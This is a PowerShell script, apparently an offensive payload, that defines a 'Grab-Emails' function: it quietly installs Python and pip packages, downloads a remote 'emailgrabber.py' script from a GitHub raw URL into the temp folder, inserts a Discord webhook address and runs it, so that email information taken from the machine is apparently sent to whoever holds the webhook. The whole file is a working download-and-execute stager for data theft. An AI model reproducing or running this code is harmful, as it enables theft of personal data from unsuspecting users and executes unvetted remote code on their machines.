function Grab-Emails {
    param (
        [Parameter(Mandatory=$false)]
        [string]$wbhk = "YOUR DISCORD WEBHOOK HERE"
    )

    # Function to download and install Python
    function InstallPython {
        $pythonUrl = "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
        $pythonInstaller = "$env:TEMP\python-installer.exe"

        # Download Python installer
        Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller

        # Install Python
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "PrependPath=1" -Wait

        # Clean up the temporary installer file
        Remove-Item $pythonInstaller -Force
    }

    # Function to install pip packages
    function InstallPipPackages {
        # Install requests and pyautogui using pip3
        pip3 install requests pyautogui
    }

    # Function to download and run the Python script
    function RunPythonScript {
        $scriptUrl = "https://raw.githubusercontent.com/calinux-py/Python/main/Adv%20Email%20Info%20Grab%20%26%20Upload/emailgrabber.py"
        $scriptPath = "$env:TEMP\emailgrabber.py"

        # Download Python script
        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

        # Replace the webhook URL in the Python script if provided
        if ($wbhk -ne "YOUR DISCORD WEBHOOK HERE") {
            (Get-Content $scriptPath) -replace "YOUR DISCORD WEBHOOK HERE", $wbhk | Set-Content $scriptPath
        }

        # Run the Python script
        python $scriptPath
    }

    # Check if Python is already installed
    if (-Not (Test-Path (Get-Command python -ErrorAction SilentlyContinue))) {
        Write-Host "Downloading and installing Python..."
        InstallPython
        Write-Host "Python installed successfully."
    } else {
        Write-Host "Python is already installed."
    }

    # Check if pip is installed
    if (-Not (Test-Path (Get-Command pip -ErrorAction SilentlyContinue))) {
        Write-Host "Installing pip..."
        InstallPipPackages
        Write-Host "Pip installed successfully."
    } else {
        Write-Host "Pip is already installed."
    }

    # Run the Python script
    Write-Host "Downloading and running the Python script..."
    RunPythonScript
}

# Call the function with the provided webhook URL

#Grab-Emails -wbhk "YOUR WEBHOOK"
